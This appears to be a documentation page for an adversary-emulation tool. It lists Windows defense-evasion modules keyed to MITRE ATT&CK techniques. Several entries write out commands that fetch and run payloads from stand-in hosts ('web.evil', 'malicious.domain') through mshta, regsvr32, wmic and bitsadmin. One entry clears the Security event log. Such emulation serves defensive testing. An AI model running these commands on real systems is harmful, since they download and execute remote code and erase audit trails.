Defense Evasion
^^^^^^^^^^^^^^^



======================================================================
T1055.002_ - Process Injection: Portable Executable Injection
======================================================================


.. _T1055.002: https://attack.mitre.org/techniques/T1055/002/

| This module uses the CreateProcess, OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread Win32 API functions to inject an innocuous shellcode.

====================================================================
T1055.004_ - Process Injection: Asynchronous Procedure Call
====================================================================


.. _T1055.004: https://attack.mitre.org/techniques/T1055/004/

| This module uses the CreateProcess, OpenProcess, VirtualAllocEx, WriteProcessMemory and QueueUserAPC Win32 API functions to inject an innocuous shellcode.


=================================
T1220_ XSL - Script Processing
=================================

.. _T1220: https://attack.mitre.org/techniques/T1220/

| This module uses the CreateProcess Win32 API to execute
| **wmic.exe os get /FORMAT "http://webserver/payload.xsl":**


====================================================================
T1070.001_ - Indicator Removal on Host: Clear Windows Event Logs
=====================================================================


.. _T1070.001: https://attack.mitre.org/techniques/T1070/001/

Variation 1
-----------

| This module uses the System.Diagnostics .NET namespace to delete the Security Event Log.

Variation 2
-----------

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **wevtutil.exe cl Security**


=======================================================
T1218.011_ - Signed Binary Proxy Execution: Rundll32
=======================================================


.. _T1218.011: https://attack.mitre.org/techniques/T1218/011/

| This module uses the CreateProcess Win32 API to execute
| **rundll32.ex C:\Windows\twain_64.dll**



====================================================
T1218.003_ - Signed Binary Proxy Execution: CMSTP
====================================================


.. _T1218.003: https://attack.mitre.org/techniques/T1218/003/


| This module uses the CreateProcess Win32 API to execute
| **cmstp.exe /s /ns C:\Users\Administrator\AppData\Local\Temp\XKNqbpzl.txt**


==================================================
T1218.005_ - Signed Binary Proxy Execution: Mshta
==================================================

.. _T1218.005: https://attack.mitre.org/techniques/T1218/005/


| This module uses the CreateProcess Win32 API to execute
| **mshta.exe http://webserver/payload.hta**

=====================================================
T1140_ - Deobfuscate/Decode Files or Information
=====================================================


.. _T1140: https://attack.mitre.org/techniques/T1140/


| This module uses the CreateProcess Win32 API to execute
| **certutil.exe -decode encodedb64.txt decoded.exe**


=====================================================
T1218.010_ - Signed Binary Proxy Execution: Regsvr32
=====================================================

.. _T1218.010: https://attack.mitre.org/techniques/T1218/010/

| This module uses the CreateProcess Win32 API to execute
| **regsvr32.exe /u /n /s /i:http://malicious.domain:8080/payload.sct scrobj.dll**


============================================================
T1218.009_ - Signed Binary Proxy Execution: Regsvcs/Regasm
============================================================


.. _T1218.009: https://attack.mitre.org/techniques/T1218/009/


| This module uses the CreateProcess Win32 API to execute
| **C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U winword.dll**

========================================================
T1218.004_ - Signed Binary Proxy Execution: InstallUtil
========================================================


.. _T1218.004: https://attack.mitre.org/techniques/T1218/004/


| This module uses the CreateProcess Win32 API to execute
| **C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U C:\Windows\Temp\XKNqbpzl.exe**


=====================
T1197_ - BITS Jobs
=====================


.. _T1197: https://attack.mitre.org/techniques/T1197/


| This module uses the CreateProcess Win32 API to execute
| **bitsadmin.exe /transfer job /download /priority high http://web.evil/sc.exe C:\Windows\Temp\winword.exe**



